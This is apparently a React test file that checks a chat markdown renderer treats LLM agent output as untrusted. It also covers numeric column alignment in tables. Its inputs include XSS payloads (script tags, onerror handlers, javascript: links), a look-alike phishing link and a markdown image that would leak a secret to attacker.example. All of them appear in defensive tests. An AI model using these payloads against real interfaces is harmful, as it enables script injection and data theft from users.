import { render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';

import { ChatMarkdown } from './ChatMarkdown';

function renderMarkdown(markdown: string) {
  return render(<ChatMarkdown>{markdown}</ChatMarkdown>);
}

describe('ChatMarkdown (untrusted LLM output, TM-012)', () => {
  it('renders GFM tables', () => {
    renderMarkdown('| Servicio | USD |\n|---|---:|\n| EC2 | 10 |');
    expect(screen.getByRole('table')).toBeInTheDocument();
    expect(screen.getByRole('cell', { name: 'EC2' })).toBeInTheDocument();
  });

  it('drops raw HTML instead of rendering it', () => {
    const { container } = renderMarkdown(
      'Hola <script>alert(1)</script><img src=x onerror="alert(1)"><iframe src="https://evil.example"></iframe><b>html</b>',
    );
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('iframe')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(container.innerHTML).not.toContain('onerror');
  });

  it('never renders anchors, so no link can navigate without confirmation', () => {
    const { container } = renderMarkdown(
      '[a](https://example.com) <https://auto.example> https://bare.example [b](javascript:alert(1)) [c](data:text/html,<script>alert(1)</script>) [d](vbscript:x) [e](/relative)',
    );
    expect(container.querySelector('a')).toBeNull();
    expect(container.innerHTML).not.toMatch(/javascript:|data:text|vbscript:/);
  });

  it('keeps unsafe link targets as plain text', () => {
    renderMarkdown('[haz clic](javascript:alert(document.domain))');
    expect(screen.getByText('haz clic').tagName).toBe('SPAN');
    expect(screen.queryByRole('button', { name: 'haz clic' })).toBeNull();
  });

  it('asks for confirmation before opening external http(s) links', async () => {
    const user = userEvent.setup();
    const openSpy = vi.spyOn(window, 'open').mockReturnValue(null);
    renderMarkdown('[docs](https://docs.aws.amazon.com/x?y=1)');

    await user.click(screen.getByRole('button', { name: 'docs' }));
    expect(openSpy).not.toHaveBeenCalled();
    const dialog = screen.getByRole('dialog', { name: 'Abrir enlace externo' });
    expect(dialog).toHaveAccessibleDescription(
      'Este enlace lo escribió el agente y te lleva fuera de Mango. Revisa la dirección completa antes de abrirla.',
    );
    // Design chat.jsx (TM-001): the host on its own line, right above the full URL.
    const host = within(dialog).getByTestId('host');
    const fullUrl = within(dialog).getByTestId('url');
    expect(host).toHaveTextContent(/^docs\.aws\.amazon\.com$/);
    expect(fullUrl).toHaveTextContent(/^https:\/\/docs\.aws\.amazon\.com\/x\?y=1$/);
    expect(host.nextElementSibling).toBe(fullUrl);

    await user.click(screen.getByRole('button', { name: 'Abrir enlace' }));
    expect(openSpy).toHaveBeenCalledWith(
      'https://docs.aws.amazon.com/x?y=1',
      '_blank',
      'noopener,noreferrer',
    );
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('shows the real host of a look-alike link apart from the URL', async () => {
    const user = userEvent.setup();
    renderMarkdown('[AWS](https://docs.aws.amazon.com.evil.example/login?next=aws.amazon.com)');
    await user.click(screen.getByRole('button', { name: 'AWS' }));
    const dialog = screen.getByRole('dialog', { name: 'Abrir enlace externo' });
    expect(within(dialog).getByTestId('host')).toHaveTextContent(
      /^docs\.aws\.amazon\.com\.evil\.example$/,
    );
  });

  it('can cancel the external link dialog', async () => {
    const user = userEvent.setup();
    const openSpy = vi.spyOn(window, 'open').mockReturnValue(null);
    renderMarkdown('[docs](https://example.com)');
    await user.click(screen.getByRole('button', { name: 'docs' }));
    await user.click(screen.getByRole('button', { name: 'Cancelar' }));
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(openSpy).not.toHaveBeenCalled();
  });

  it('blocks remote images (no request is made)', () => {
    const { container } = renderMarkdown('![pixel](https://attacker.example/p.png?d=secret)');
    expect(container.querySelector('img')).toBeNull();
    // Design: no alt text, and a title that explains why.
    const placeholder = screen.getByText('[Imagen bloqueada]');
    expect(placeholder).toHaveAttribute('title', 'Las imágenes del agente no se cargan');
    expect(container).not.toHaveTextContent('pixel');
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it('renders #### as the smallest heading (h3), like the design', () => {
    renderMarkdown('#### Detalle');
    expect(screen.getByRole('heading', { level: 3, name: 'Detalle' })).toBeInTheDocument();
  });

  it('renders code blocks as text', () => {
    const { container } = renderMarkdown('```html\n<script>alert(1)</script>\n```');
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('code')).toHaveTextContent('<script>alert(1)</script>');
  });
});

describe('ChatMarkdown numeric columns (design markdown.js)', () => {
  /** Class of every cell of a column: header first, then the body rows. */
  function columnClasses(container: HTMLElement, column: number) {
    return [...container.querySelectorAll('tr')].map(
      (row) => row.children[column]?.className ?? null,
    );
  }

  it('right-aligns only the columns whose body cells are all figures, header included', () => {
    const { container } = renderMarkdown(
      [
        '| Servicio | MTD | Δ vs sept | Nota |',
        '|---|---|---|---|',
        '| EC2 | $48,210 | **+18.4%** | sube |',
        '| S3 | USD 31.890,50 | −2,1 % | 12 |',
        '| RDS | 1 200 ms | | ok |',
      ].join('\n'),
    );
    expect(columnClasses(container, 0)).toEqual(['', '', '', '']);
    expect(columnClasses(container, 1)).toEqual(['num', 'num', 'num', 'num']);
    // Empty cells do not count; bold figures do.
    expect(columnClasses(container, 2)).toEqual(['num', 'num', 'num', 'num']);
    // One non-numeric cell is enough to keep the column left-aligned.
    expect(columnClasses(container, 3)).toEqual(['', '', '', '']);
  });

  it('is not "the last two columns": position does not matter', () => {
    const { container } = renderMarkdown(
      '| # | Cuenta | Área |\n|---|---|---|\n| 1 | prod-main | finanzas |\n| 2 | prod-data | retail |',
    );
    expect(columnClasses(container, 0)).toEqual(['num', 'num', 'num']);
    expect(columnClasses(container, 1)).toEqual(['', '', '']);
    expect(columnClasses(container, 2)).toEqual(['', '', '']);
  });

  it('ignores the GFM alignment markers and adds no inline style', () => {
    const { container } = renderMarkdown(
      '| Servicio | Equipo |\n|---:|:---:|\n| EC2 | plataforma |',
    );
    expect(container.querySelector('.num')).toBeNull();
    expect(container.querySelector('[style]')).toBeNull();
    expect(container.querySelector('[align]')).toBeNull();
  });

  it('does not align a column without body cells, or with code, links or emphasis', () => {
    const empty = renderMarkdown('| Total |\n|---|');
    expect(empty.container.querySelector('.num')).toBeNull();
    empty.unmount();

    const { container } = renderMarkdown(
      '| A | B | C |\n|---|---|---|\n| `10` | [20](https://example.com) | *30* |',
    );
    expect(container.querySelector('.num')).toBeNull();
  });

  it('treats an oversized cell as text', () => {
    const { container } = renderMarkdown(`| N |\n|---|\n| 1${' '.repeat(5000)}2 |\n| 3 |`);
    expect(container.querySelector('.num')).toBeNull();
  });
});
